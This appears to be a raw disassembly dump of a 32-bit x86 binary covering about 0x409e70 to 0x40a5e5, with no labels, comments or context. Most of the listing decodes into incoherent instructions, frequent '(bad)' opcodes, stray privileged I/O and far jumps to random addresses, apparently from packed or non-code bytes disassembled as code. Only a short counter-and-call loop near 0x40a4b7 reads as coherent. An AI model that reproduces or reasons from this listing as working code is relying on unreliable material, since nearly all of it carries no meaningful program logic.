  409e70:	mov    cl,0xb0
  409e72:	inc    ebp
  409e73:	and    edi,edx
  409e75:	fucomip st,st(7)
  409e77:	jae    0x409e42
  409e79:	cmc    
  409e7a:	test   eax,0xd740f4a1
  409e7f:	das    
  409e80:	lds    ebp,FWORD PTR [eax-0x7c]
  409e83:	inc    eax
  409e84:	xchg   ebp,eax
  409e85:	jno    0x409e4e
  409e87:	into   
  409e88:	retf   0x5470
  409e8b:	popa   
  409e8c:	mov    al,ds:0x9c773064
  409e91:	xchg   ebp,eax
  409e92:	push   ds
  409e93:	(bad)  
  409e95:	sbb    BYTE PTR [esi+0x6e],al
  409e98:	sbb    eax,0xa9eee461
  409e9d:	or     eax,0x549e161
  409ea2:	jnp    0x409e82
  409ea4:	pop    ecx
  409ea5:	push   eax
  409ea6:	outs   dx,DWORD PTR ds:[esi]
  409ea7:	fdiv   st,st(7)
  409ea9:	dec    edx
  409eaa:	jo     0x409ee7
  409eac:	imul   eax,eax,0xffffff94
  409eaf:	ds ret 
  409eb1:	add    BYTE PTR [esi-0x1c],dl
  409eb4:	mov    ds:0xdbb3e01b,al
  409eb9:	mov    al,ds:0xd6a72d4d
  409ebe:	mov    esp,0x89ad7991
  409ec3:	inc    esi
  409ec4:	mov    edx,0x72881d5
  409ec9:	xchg   edi,eax
  409eca:	xor    BYTE PTR [ecx],0x66
  409ecd:	inc    ebx
  409ecf:	dec    ebp
  409ed0:	bound  edx,QWORD PTR cs:[esi+edx*1]
  409ed4:	retf   0x9746
  409ed7:	mov    dh,0x31
  409ed9:	sahf   
  409eda:	int3   
  409edb:	sbb    ebp,eax
  409edd:	(bad)  
  409ede:	clc    
  409edf:	aam    0x61
  409ee1:	adc    BYTE PTR cs:[edi],dl
  409ee4:	(bad)
  409ee8:	adc    eax,0xcfef663c
  409eed:	scas   eax,DWORD PTR es:[edi]
  409eee:	mov    dl,0x4a
  409ef0:	xchg   edx,eax
  409ef1:	hlt    
  409ef2:	add    bh,BYTE PTR [ebx+0x28]
  409ef5:	fist   DWORD PTR [eax-0x7e007ac4]
  409efb:	fisubr DWORD PTR [ecx-0x7006ac95]
  409f01:	rcl    ebp,0x3d
  409f04:	jno    0x409ed1
  409f06:	aas    
  409f07:	push   ebx
  409f08:	mov    ah,BYTE PTR [edi]
  409f0a:	sub    edi,DWORD PTR [eax+0x42]
  409f0d:	jb     0x409ed1
  409f0f:	dec    esp
  409f10:	pop    ss
  409f11:	jl     0x409f91
  409f13:	cmp    al,0xc3
  409f15:	jecxz  0x409f06
  409f17:	add    ch,cl
  409f19:	test   DWORD PTR [esi],edx
  409f1b:	mov    DWORD PTR [esi],esi
  409f1d:	bound  esi,QWORD PTR [ebx-0x5807a70e]
  409f23:	aaa    
  409f24:	xchg   esp,eax
  409f25:	lods   eax,DWORD PTR ds:[esi]
  409f26:	dec    esp
  409f27:	and    esi,ebx
  409f29:	repnz lds esp,FWORD PTR [eax]
  409f2c:	xor    eax,0xf6eed538
  409f31:	rol    DWORD PTR [eax+edi*8],cl
  409f34:	(bad)  
  409f35:	and    eax,0x99b5506c
  409f3a:	push   esi
  409f3b:	sub    edi,0xc5785fba
  409f41:	pop    esi
  409f42:	push   ds
  409f43:	pop    ebp
  409f44:	jnp    0x409fb9
  409f46:	inc    esi
  409f47:	leave  
  409f48:	nop
  409f49:	cmp    eax,esp
  409f4b:	out    0x1b,eax
  409f4d:	scas   eax,DWORD PTR es:[edi]
  409f4e:	mov    ecx,0xfc5c8763
  409f53:	retf   
  409f54:	loopne 0x409efc
  409f56:	push   cs
  409f57:	aaa    
  409f58:	sub    BYTE PTR [edx],bl
  409f5a:	pusha  
  409f5b:	hlt    
  409f5c:	mov    dl,0x63
  409f5e:	mov    ebp,0x51bc0e29
  409f63:	enter  0x3bcc,0x7d
  409f67:	stc    
  409f68:	push   ebp
  409f69:	int3   
  409f6a:	pop    ds
  409f6b:	add    DWORD PTR [esi],edi
  409f6d:	(bad)  
  409f6e:	xor    bh,BYTE PTR [ecx-0x57]
  409f71:	jo     0x409f81
  409f73:	cmp    eax,0x6b1d2c4d
  409f78:	sti    
  409f79:	xchg   edx,eax
  409f7a:	jge    0x409f56
  409f7c:	cmp    eax,0x696511aa
  409f81:	addr16 (bad) 
  409f83:	cmp    ecx,DWORD PTR [edx]
  409f85:	push   ss
  409f86:	sub    esi,ecx
  409f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f89:	outs   dx,DWORD PTR ds:[esi]
  409f8a:	inc    esp
  409f8b:	leave  
  409f8c:	ror    bl,cl
  409f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f8f:	cmp    DWORD PTR [esi+0x12e0102f],eax
  409f95:	dec    ecx
  409f96:	adc    al,0xdf
  409f98:	jp     0x409f3d
  409f9a:	jmp    DWORD PTR [eax+0x2f]
  409f9d:	mov    DWORD PTR [esi-0x1b7a4031],ebx
  409fa3:	sbb    ecx,DWORD PTR [ebp-0x242aa410]
  409fa9:	pop    ss
  409faa:	in     al,dx
  409fab:	pop    ecx
  409fac:	cmp    DWORD PTR [ebx+0x7d],ecx
  409faf:	das    
  409fb0:	jne    0x409fa3
  409fb2:	mov    al,0x66
  409fb4:	inc    edi
  409fb5:	push   eax
  409fb6:	rol    ecx,1
  409fb8:	lds    edi,FWORD PTR [eax+0x40]
  409fbb:	ins    BYTE PTR es:[edi],dx
  409fbc:	push   ebx
  409fbd:	sub    al,0x4a
  409fbf:	repz mov ecx,0xb84ca04a
  409fc5:	arpl   WORD PTR [ebp-0x59bcc685],bx
  409fcb:	js     0x40a044
  409fcd:	dec    esp
  409fce:	loop   0x409fe5
  409fd0:	sub    bh,bl
  409fd2:	(bad)  
  409fd3:	outs   dx,DWORD PTR ds:[esi]
  409fd4:	dec    ebx
  409fd5:	mov    esp,0x32a03805
  409fda:	inc    ebx
  409fdb:	pop    ecx
  409fdc:	mov    BYTE PTR [ecx-0x2b],bh
  409fdf:	add    DWORD PTR [esi],esi
  409fe1:	cs jg  0x409f7d
  409fe4:	pop    esp
  409fe5:	dec    esi
  409fe6:	xchg   esp,eax
  409fe7:	jecxz  0x409f7d
  409fe9:	fidivr DWORD PTR gs:[ebp+0x33]
  409fed:	in     eax,dx
  409fee:	adc    eax,DWORD PTR [ebp-0x5d554234]
  409ff4:	out    0x14,eax
  409ff6:	mov    ah,0x72
  409ff8:	or     eax,0x9be2bfde
  409ffd:	ins    BYTE PTR es:[edi],dx
  409ffe:	imul   esi,DWORD PTR [ebp-0x4d08d24e],0x31cdf1c4
  40a008:	es test eax,0x72b1d144
  40a00e:	mov    dl,0xd
  40a010:	mov    ebp,0x8d24bc50
  40a015:	inc    ebx
  40a016:	dec    edi
  40a017:	push   edi
  40a018:	int3   
  40a019:	sbb    al,0x31
  40a01b:	fs dec edx
  40a01d:	xor    BYTE PTR [ebp+0xb],dl
  40a020:	sub    BYTE PTR [eax+0x1d],al
  40a023:	jbe    0x40a05d
  40a025:	ret    
  40a026:	lds    esp,FWORD PTR [ecx-0x1e]
  40a029:	cmp    ch,BYTE PTR [edi+0x0]
  40a02c:	jecxz  0x409fff
  40a02e:	into   
  40a02f:	xor    dl,BYTE PTR [edx-0x57]
  40a032:	sub    WORD PTR ds:[esi-0x306ff023],sp
  40a03a:	add    DWORD PTR [ecx+0x7c5a805c],0x1a2ab6a9
  40a044:	dec    ecx
  40a045:	xchg   esp,eax
  40a046:	idiv   BYTE PTR [ebp+0x97cceb1]
  40a04c:	xchg   edi,eax
  40a04d:	xor    cl,ch
  40a04f:	inc    ecx
  40a050:	sbb    DWORD PTR [esi-0x67446efd],0x2d3ba846
  40a05a:	popf   
  40a05b:	xchg   ebp,eax
  40a05c:	outs   dx,DWORD PTR ds:[esi]
  40a05d:	stos   DWORD PTR es:[edi],eax
  40a05e:	popa   
  40a05f:	aaa    
  40a060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a061:	jbe    0x40a02f
  40a063:	add    eax,0x81dd34f2
  40a068:	cld    
  40a069:	fcomi  st,st(0)
  40a06b:	push   cs
  40a06c:	sbb    BYTE PTR [eax],cl
  40a06e:	data16 cld 
  40a070:	out    dx,al
  40a071:	mov    ds:0x43ec025d,al
  40a076:	pop    eax
  40a077:	mov    ebp,0x3e65fd45
  40a07c:	jle    0x40a0b1
  40a07e:	jecxz  0x40a0bc
  40a080:	adc    BYTE PTR [ecx],al
  40a082:	mov    ds:0x967abae3,eax
  40a087:	ins    BYTE PTR es:[edi],dx
  40a088:	pusha  
  40a089:	mov    ss,WORD PTR [edi+0x25]
  40a08c:	dec    edi
  40a08d:	push   edi
  40a08e:	xchg   esp,eax
  40a08f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a090:	daa    
  40a091:	mov    ah,0xf9
  40a093:	add    eax,0x41eed81d
  40a098:	or     dh,BYTE PTR [edx+0x7d]
  40a09b:	fist   DWORD PTR [esi]
  40a09d:	add    BYTE PTR [ebp-0x50],bh
  40a0a0:	pusha  
  40a0a1:	imul   BYTE PTR [ebp+0x4]
  40a0a4:	xor    dl,dh
  40a0a6:	push   ds
  40a0a7:	dec    esp
  40a0a8:	xchg   BYTE PTR fs:[ecx+0x71],ah
  40a0ac:	dec    ecx
  40a0ad:	fstp   st(2)
  40a0af:	stos   BYTE PTR es:[edi],al
  40a0b0:	dec    eax
  40a0b1:	scas   al,BYTE PTR es:[edi]
  40a0b2:	es pop eax
  40a0b4:	mov    esp,0x9d0000e1
  40a0b9:	jne    0x5e1900c
  40a0bf:	jne    0x40a12b
  40a0c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0c2:	hlt    
  40a0c3:	sbb    BYTE PTR [ecx+ebx*4],ah
  40a0c6:	inc    esp
  40a0c7:	call   0xf8a9:0x3d61d30f
  40a0ce:	shl    BYTE PTR [ecx-0xe4dc94b],1
  40a0d4:	test   DWORD PTR [ecx+0x7c],ebx
  40a0d7:	mov    esp,0x16b67c23
  40a0dc:	sbb    eax,0x9fcb589c
  40a0e1:	adc    al,0x60
  40a0e3:	das    
  40a0e4:	and    al,0x7d
  40a0e6:	mov    dl,0x4d
  40a0e8:	xchg   ebx,eax
  40a0e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0ea:	xchg   ebx,eax
  40a0eb:	gs pusha 
  40a0ed:	xchg   edx,eax
  40a0ee:	shl    DWORD PTR [edi+0x76],0xc6
  40a0f2:	mov    al,ds:0xa88da339
  40a0f7:	adc    al,0xc8
  40a0f9:	cmp    ecx,esp
  40a0fb:	add    BYTE PTR [esi],cl
  40a0fd:	inc    ebx
  40a0fe:	mov    ds:0x83bb4e77,eax
  40a103:	pop    eax
  40a104:	xlat   BYTE PTR ds:[ebx]
  40a105:	jmp    0x4817a803
  40a10a:	dec    edx
  40a10b:	pusha  
  40a10c:	sar    DWORD PTR [esi-0x74],cl
  40a10f:	into   
  40a110:	pop    esp
  40a111:	mov    ebp,DWORD PTR [ebp-0x69]
  40a114:	imul   eax,ecx,0x7e8afba6
  40a11a:	int3   
  40a11b:	dec    eax
  40a11c:	cmp    al,0x58
  40a11e:	dec    edx
  40a11f:	push   esi
  40a120:	cwde   
  40a121:	mov    ds:0xca54f2e6,al
  40a126:	arpl   dx,bx
  40a128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a129:	xor    eax,0xfc174cf1
  40a12e:	and    edi,DWORD PTR [eax]
  40a130:	test   al,0xd7
  40a132:	leave  
  40a133:	pop    ecx
  40a134:	lahf   
  40a135:	ins    DWORD PTR es:[edi],dx
  40a136:	out    dx,eax
  40a137:	shl    ebp,cl
  40a139:	add    BYTE PTR [ecx],al
  40a13b:	mov    ds:0x4cad47bb,al
  40a140:	js     0x40a11a
  40a142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a143:	cli    
  40a144:	test   al,al
  40a146:	xchg   edx,eax
  40a147:	(bad)  
  40a148:	cmc    
  40a149:	imul   esp,DWORD PTR [esi],0xaee0d6ea
  40a14f:	mov    bl,0xc7
  40a151:	jno    0x40a192
  40a153:	adc    esi,DWORD PTR [ebp-0x6c]
  40a156:	fisubr DWORD PTR [esi-0xb322788]
  40a15c:	inc    edi
  40a15d:	mov    esi,0x5a8da511
  40a162:	das    
  40a163:	jmp    0xc673e758
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	popa   
  40a17a:	mov    ebp,0xe739dfc9
  40a17f:	jle    0x40a1ff
  40a181:	cs jge 0x40a202
  40a184:	jle    0x40a148
  40a186:	or     DWORD PTR [ecx+0x2236a79],0x34318629
  40a190:	xor    eax,0xcab457d9
  40a195:	push   ebp
  40a196:	jmp    0x89122f50
  40a19b:	xchg   ebx,eax
  40a19c:	mov    DWORD PTR [ebx+0x26],ebp
  40a19f:	or     eax,0x61391419
  40a1a4:	cmp    BYTE PTR [edx-0x61],dh
  40a1a7:	xor    ebx,DWORD PTR [ebx+0x17]
  40a1aa:	push   esi
  40a1ab:	into   
  40a1ac:	sub    dl,BYTE PTR [eax]
  40a1ae:	adc    BYTE PTR [esi-0x20],al
  40a1b1:	sub    ebx,esi
  40a1b3:	pop    esp
  40a1b4:	loopne 0x40a1ac
  40a1b6:	retf   
  40a1b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1b8:	adc    ebx,0x3af3eb60
  40a1be:	in     al,dx
  40a1bf:	dec    eax
  40a1c0:	xor    edi,edi
  40a1c2:	cmp    eax,0xde1cd71a
  40a1c7:	sub    esp,esi
  40a1c9:	mov    eax,DWORD PTR [esi-0x4f]
  40a1cc:	push   ds
  40a1cd:	xchg   edi,eax
  40a1ce:	lahf   
  40a1cf:	mov    dl,0x87
  40a1d1:	fucomp st(6)
  40a1d3:	pop    edi
  40a1d4:	dec    eax
  40a1d5:	sub    esi,DWORD PTR [ebp-0x6e375952]
  40a1db:	scas   eax,DWORD PTR es:[edi]
  40a1dc:	arpl   di,ax
  40a1de:	jne    0x40a1fa
  40a1e0:	xor    BYTE PTR [ebp+0x2afef222],0xc3
  40a1e7:	(bad)  
  40a1e9:	push   edx
  40a1ea:	xor    ecx,ecx
  40a1ec:	outs   dx,DWORD PTR ds:[esi]
  40a1ed:	inc    ebp
  40a1ee:	inc    esi
  40a1ef:	push   ss
  40a1f0:	ret    0xa47f
  40a1f3:	stos   DWORD PTR es:[edi],eax
  40a1f4:	cli    
  40a1f5:	jb     0x40a1b6
  40a1f7:	pop    ebx
  40a1f8:	fimul  DWORD PTR [edx]
  40a1fa:	pmulhuw mm6,QWORD PTR [ebp+0x7d]
  40a1fe:	add    esi,DWORD PTR [di]
  40a201:	shl    BYTE PTR [eax],cl
  40a203:	fistp  DWORD PTR [ebx+edi*1]
  40a206:	fisub  DWORD PTR [ebx-0x7c]
  40a209:	gs je  0x40a1e1
  40a20c:	add    al,0x99
  40a20e:	lock or BYTE PTR [ebp+0x40],ah
  40a212:	jecxz  0x40a26b
  40a214:	not    bl
  40a216:	and    al,0x21
  40a218:	xchg   edx,ebx
  40a21a:	sub    ebx,DWORD PTR [edi]
  40a21c:	mul    edi
  40a21e:	cmp    eax,0x39f47eb1
  40a223:	mov    ebx,esi
  40a225:	sbb    DWORD PTR [esi-0x11bbae63],esi
  40a22b:	ins    BYTE PTR es:[edi],dx
  40a22c:	push   ss
  40a22d:	ins    BYTE PTR es:[edi],dx
  40a22e:	add    edx,DWORD PTR [edx-0x1e]
  40a231:	xlat   BYTE PTR ds:[ebx]
  40a232:	or     edi,ecx
  40a234:	out    dx,al
  40a235:	fisub  DWORD PTR [ebp+0x3157d694]
  40a23b:	test   eax,0x4e46bf73
  40a240:	mov    esi,0x53d8e0a9
  40a245:	test   BYTE PTR [eax-0x1d],0xef
  40a249:	add    al,0x1
  40a24b:	cmp    ebp,DWORD PTR [ebx]
  40a24d:	fsub   QWORD PTR [ebp-0x3]
  40a250:	sar    BYTE PTR [ebp-0x65],0xb2
  40a254:	daa    
  40a255:	xor    dl,0xd1
  40a258:	imul   ecx,DWORD PTR [ebx-0xa],0x2235926a
  40a25f:	test   eax,0x7c5fe42f
  40a264:	call   0xcdb2:0x2fd6aad8
  40a26b:	rcl    DWORD PTR [edi-0x66e72818],cl
  40a271:	dec    ebp
  40a272:	sub    DWORD PTR [edi+0x25],ebp
  40a275:	fldenv gs:[edi]
  40a278:	push   esi
  40a279:	mov    ebp,0xfd032b22
  40a27e:	jmp    0x40a230
  40a280:	fucomi st,st(2)
  40a282:	adc    BYTE PTR [ebp-0x15],al
  40a285:	scas   al,BYTE PTR es:[edi]
  40a286:	sub    al,0x1c
  40a288:	test   DWORD PTR [eax*4-0x7ca07d98],ecx
  40a28f:	mov    esp,0x1bbf1992
  40a294:	je     0x40a2d5
  40a296:	retf   0x68f3
  40a299:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a29b:	gs ins BYTE PTR es:[edi],dx
  40a29d:	mov    dh,0x1b
  40a29f:	or     eax,0x4c75205f
  40a2a4:	inc    ebp
  40a2a5:	inc    eax
  40a2a6:	or     ebp,edi
  40a2a8:	mov    cl,0xdd
  40a2aa:	bound  ecx,QWORD PTR [eax]
  40a2ac:	ret    0xf80a
  40a2af:	fdivp  st(2),st
  40a2b1:	pop    ebp
  40a2b2:	pop    esi
  40a2b3:	add    bh,BYTE PTR [ebx-0x72]
  40a2b6:	sahf   
  40a2b7:	dec    esi
  40a2b8:	push   ss
  40a2b9:	xchg   DWORD PTR [edx-0x8b64547],eax
  40a2bf:	mov    esi,0xd34f9129
  40a2c4:	fsub   DWORD PTR [ecx+0x78b27ced]
  40a2ca:	mov    ah,0x62
  40a2cc:	popf   
  40a2cd:	out    0x2b,al
  40a2cf:	xor    BYTE PTR [esi+0x2],bl
  40a2d2:	leave  
  40a2d3:	xchg   BYTE PTR [edx],bh
  40a2d5:	ds test eax,0xb513876d
  40a2db:	ins    BYTE PTR es:[edi],dx
  40a2dc:	and    eax,0xb4236964
  40a2e1:	cdq    
  40a2e2:	stos   DWORD PTR es:[edi],eax
  40a2e3:	xor    cl,bh
  40a2e5:	xchg   edx,eax
  40a2e6:	mov    ah,0xb4
  40a2e8:	jns    0x40a2a3
  40a2ea:	lahf   
  40a2eb:	sub    al,0x34
  40a2ed:	adc    eax,0x3483dcde
  40a2f2:	inc    eax
  40a2f3:	cli    
  40a2f4:	xor    bl,BYTE PTR [edi-0x51]
  40a2f7:	jmp    0xa67b8a31
  40a2fc:	push   edi
  40a2fd:	xchg   DWORD PTR [ebx],ecx
  40a2ff:	push   esp
  40a300:	movups XMMWORD PTR ds:0xf160466b,xmm7
  40a307:	imul   edx,DWORD PTR [edx-0x3d],0xb350ace9
  40a30e:	sti    
  40a30f:	mov    ds:0x81d6ca20,eax
  40a314:	pusha  
  40a315:	lds    edi,FWORD PTR [ebx]
  40a317:	call   0x9bbf9af6
  40a31c:	jne    0x40a398
  40a31e:	inc    ecx
  40a31f:	adc    eax,0x100fecc8
  40a324:	mov    BYTE PTR [ecx+ecx*4-0x23],bh
  40a328:	icebp  
  40a329:	push   esp
  40a32a:	lods   eax,DWORD PTR ds:[esi]
  40a32b:	aad    0xef
  40a32d:	and    al,0xe2
  40a32f:	or     bh,BYTE PTR [esi+0x1f]
  40a332:	cmp    BYTE PTR [ecx+0x13],ch
  40a335:	(bad)  
  40a336:	in     al,0x2c
  40a338:	daa    
  40a339:	adc    DWORD PTR [eax],edx
  40a33b:	bound  ebx,QWORD PTR [eax+0x27d69f4a]
  40a341:	adc    esi,DWORD PTR [edx+0x1d]
  40a344:	xlat   BYTE PTR ds:[ebx]
  40a345:	jns    0x40a33c
  40a347:	lea    ebx,[eax+esi*8]
  40a34a:	cmp    ecx,DWORD PTR [esi+0x20b591ad]
  40a350:	add    al,0x93
  40a352:	sbb    bl,ch
  40a354:	iret   
  40a355:	ffree  st(6)
  40a357:	mov    edx,0x8503a346
  40a35c:	inc    edi
  40a35d:	push   ebp
  40a35e:	enter  0xaeba,0xb4
  40a362:	pop    esi
  40a363:	adc    BYTE PTR [ebx],dl
  40a365:	arpl   WORD PTR [ebx],sp
  40a367:	xchg   esi,eax
  40a368:	inc    DWORD PTR [ebx]
  40a36a:	(bad)  
  40a36b:	sbb    esp,DWORD PTR [edx-0x54]
  40a36e:	xor    ch,BYTE PTR [esi-0x8439b20]
  40a374:	fisttp DWORD PTR [ebx]
  40a376:	mov    dl,0xfb
  40a378:	out    0xed,eax
  40a37a:	data16 sahf 
  40a37c:	jmp    FWORD PTR ds:0xb7f0ba32
  40a382:	aas    
  40a383:	fldcw  WORD PTR ds:0x4e819a81
  40a389:	mov    di,0x9dcf
  40a38d:	cmp    al,0x25
  40a38f:	das    
  40a390:	lds    ebx,FWORD PTR [edi-0x62acfcaf]
  40a396:	fucom  st(0)
  40a398:	pop    DWORD PTR [ecx]
  40a39a:	sub    eax,0xe13f8b7d
  40a39f:	idiv   BYTE PTR [ebx-0x380f3f60]
  40a3a5:	jne    0x40a383
  40a3a7:	(bad)  
  40a3a8:	test   eax,0x77392386
  40a3ad:	retf   
  40a3ae:	pop    edi
  40a3af:	adc    al,0x6c
  40a3b1:	shl    ebp,0x88
  40a3b4:	mov    esi,0x5e88ee76
  40a3b9:	mov    esp,DWORD PTR [edi]
  40a3bb:	inc    ebx
  40a3bc:	popa   
  40a3bd:	push   0x825f9c8d
  40a3c2:	push   ebp
  40a3c3:	adc    ch,dl
  40a3c5:	lock mov ah,0x3e
  40a3c8:	hlt    
  40a3c9:	stos   BYTE PTR es:[edi],al
  40a3ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3cb:	jne    0x40a420
  40a3cd:	pop    ebx
  40a3ce:	dec    ecx
  40a3cf:	sub    cl,bh
  40a3d1:	or     esi,DWORD PTR [ecx-0x39]
  40a3d4:	cdq    
  40a3d5:	sahf   
  40a3d6:	shr    BYTE PTR [ecx-0x65],cl
  40a3d9:	shl    DWORD PTR [ecx+0x467084f5],1
  40a3df:	pop    esp
  40a3e0:	push   ecx
  40a3e1:	repz test eax,0x9eada994
  40a3e7:	aad    0x74
  40a3e9:	lods   al,BYTE PTR ds:[esi]
  40a3ea:	stos   DWORD PTR es:[edi],eax
  40a3eb:	ret    0x35a7
  40a3ee:	mov    ah,0x75
  40a3f0:	scas   al,BYTE PTR es:[edi]
  40a3f1:	and    BYTE PTR [ecx+0x23],dh
  40a3f4:	out    dx,eax
  40a3f5:	sub    BYTE PTR [eax-0x6d],dh
  40a3f8:	and    bl,bl
  40a3fa:	nop
  40a3fb:	sbb    dl,BYTE PTR [eax+0x6e]
  40a3fe:	jg     0x40a3b1
  40a400:	test   al,0x13
  40a402:	push   eax
  40a403:	dec    ebx
  40a404:	and    al,0x26
  40a406:	inc    edx
  40a407:	shr    DWORD PTR [ebx+0x4],0x99
  40a40b:	clc    
  40a40c:	jne    0x40a45b
  40a40e:	ror    DWORD PTR [edi],0xec
  40a411:	aaa    
  40a412:	jo     0x40a40f
  40a414:	popa   
  40a415:	mov    edx,0xe70c7621
  40a41a:	xchg   edi,eax
  40a41b:	loope  0x40a424
  40a41d:	pop    ebx
  40a41e:	xor    ebx,DWORD PTR [ebx-0x49]
  40a421:	(bad)  
  40a422:	enter  0x6b2f,0x9f
  40a426:	rcl    DWORD PTR [eax-0x19],0x29
  40a42a:	jmp    DWORD PTR [eax+edi*2-0x7ed293d3]
  40a431:	lock iret 
  40a433:	mov    esp,0xaa0de278
  40a438:	std    
  40a439:	jmp    0xb2f5:0x30f48a5a
  40a440:	inc    esi
  40a441:	cmp    bl,BYTE PTR ds:[eax-0x55272c2c]
  40a448:	pop    esp
  40a449:	mov    ecx,0xbfc9c649
  40a44e:	cmp    bl,BYTE PTR [edi-0x211a0a0e]
  40a454:	inc    edx
  40a455:	(bad)  
  40a456:	ja     0x40a4b7
  40a458:	mov    dh,BYTE PTR [ebp-0x16]
  40a45b:	test   al,0xe2
  40a45d:	aas    
  40a45e:	xchg   esi,eax
  40a45f:	div    DWORD PTR ds:0xca9d0f14
  40a465:	loop   0x40a4dd
  40a467:	dec    esi
  40a468:	add    dl,BYTE PTR [ebx-0x73]
  40a46b:	fdivr  QWORD PTR [ebx+eiz*1-0x24]
  40a46f:	lahf   
  40a470:	sbb    eax,0xbeb60f08
  40a475:	leave  
  40a476:	test   ah,bh
  40a478:	fistp  WORD PTR [ebx-0x46]
  40a47b:	push   ss
  40a47c:	or     BYTE PTR [edi+0x74],0xef
  40a480:	pop    ebp
  40a481:	loopne 0x40a488
  40a483:	jmp    0xe189533d
  40a488:	out    0x30,al
  40a48a:	js     0x40a4d7
  40a48c:	neg    DWORD PTR [eax-0x54]
  40a48f:	mov    edi,0xba961fcf
  40a494:	fnsave [edi-0x14c522b1]
  40a49a:	mov    dh,0xa
  40a49c:	lods   al,BYTE PTR ds:[esi]
  40a49d:	mov    ch,0xca
  40a49f:	outs   dx,DWORD PTR ds:[esi]
  40a4a0:	mov    es,WORD PTR [ebx+0x5]
  40a4a3:	pop    edi
  40a4a4:	inc    ebx
  40a4a5:	mov    ebx,0x61e635fa
  40a4aa:	icebp  
  40a4ab:	cwde   
  40a4ac:	sbb    eax,0xc3d2c124
  40a4b1:	add    DWORD PTR ds:0xc703b26f,eax
  40a4b7:	and    DWORD PTR ds:0x4302f1,0x0
  40a4c1:	xor    ebx,ebx
  40a4c3:	or     ebx,DWORD PTR ds:0x4302f1
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x4302f1,ebx
  40a4d0:	cmp    DWORD PTR ds:0x4302f1,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42eabb
  40a4e8:	cmp    DWORD PTR ds:0x4302f1,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	adc    edx,DWORD PTR ss:[esi-0x1d168dab]
  40a517:	jle    0x40a597
  40a519:	cs jge 0x40a59a
  40a51c:	jle    0x40a4d6
  40a51e:	inc    ecx
  40a51f:	add    DWORD PTR [edx-0x6fe98cf5],esi
  40a525:	jno    0x40a58a
  40a527:	mov    ecx,0xfbe93cf0
  40a52c:	in     eax,0x9e
  40a52e:	repnz cmp DWORD PTR [ecx-0x504821d8],eax
  40a535:	mov    esp,0x6fce8867
  40a53a:	sti    
  40a53b:	xchg   esp,eax
  40a53c:	push   edx
  40a53d:	mov    DWORD PTR ds:0x74035101,edi
  40a543:	icebp  
  40a544:	sub    ecx,DWORD PTR [ebp-0x2ee2cacb]
  40a54a:	pushf  
  40a54b:	xor    bh,ah
  40a54d:	mov    ds:0x478c89c9,al
  40a552:	fisubr WORD PTR [ebx]
  40a554:	dec    esi
  40a555:	sbb    esi,ebp
  40a557:	cmp    edi,DWORD PTR [ecx]
  40a559:	adc    eax,0x3f5a0d61
  40a55e:	mov    dh,0xa3
  40a560:	inc    ecx
  40a561:	icebp  
  40a562:	xor    al,al
  40a564:	adc    DWORD PTR [edi-0xbd52ec5],ebx
  40a56a:	adc    BYTE PTR [esi-0x6a],cl
  40a56d:	push   ecx
  40a56e:	ins    BYTE PTR es:[edi],dx
  40a56f:	dec    ebp
  40a570:	and    al,BYTE PTR [ebp-0x3d568a45]
  40a576:	ror    BYTE PTR [ebx-0x195d6755],0x1a
  40a57d:	aam    0x74
  40a57f:	jmp    0x40a5fb
  40a581:	adc    ah,BYTE PTR [esi+eax*1]
  40a584:	xor    BYTE PTR [edx+0x58728150],al
  40a58a:	ret    
  40a58b:	es push ss
  40a58d:	or     BYTE PTR [ebp+0xc],ah
  40a590:	add    eax,0x576f2dc5
  40a595:	js     0x40a5b3
  40a597:	retf   
  40a598:	push   0x2c
  40a59a:	jne    0x40a5ee
  40a59c:	sub    bh,ch
  40a59e:	mov    ecx,0x9b95fc95
  40a5a3:	sbb    BYTE PTR [edx+0x5],al
  40a5a6:	sub    dl,BYTE PTR [edi]
  40a5a8:	into   
  40a5a9:	sbb    al,0xee
  40a5ab:	rcr    BYTE PTR [ebp+0x52],1
  40a5ae:	sub    ebx,edx
  40a5b0:	test   eax,0x6402ca08
  40a5b5:	stos   BYTE PTR es:[edi],al
  40a5b6:	inc    esi
  40a5b7:	pusha  
  40a5b8:	outs   dx,BYTE PTR ds:[esi]
  40a5b9:	fild   DWORD PTR [edx-0x668acf71]
  40a5bf:	inc    ebx
  40a5c0:	mov    cl,0xee
  40a5c2:	cwde   
  40a5c3:	mov    ebx,0x7e90a940
  40a5c8:	xchg   ecx,eax
  40a5c9:	stos   DWORD PTR es:[edi],eax
  40a5ca:	sti    
  40a5cb:	dec    eax
  40a5cc:	mov    dl,0x6e
  40a5ce:	ds test al,0x15
  40a5d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5d2:	cwde   
  40a5d3:	mov    DWORD PTR [esi],edi
  40a5d5:	pusha  
  40a5d6:	jb     0x40a5ba
  40a5d8:	inc    esi
  40a5d9:	dec    ecx
  40a5da:	mov    al,ds:0x2eb92933
  40a5df:	mov    cl,0x65
  40a5e1:	add    BYTE PTR [ebx-0x31],0x57
  40a5e5:	or     DWORD PTR ss:[ebx+0x5e],esp
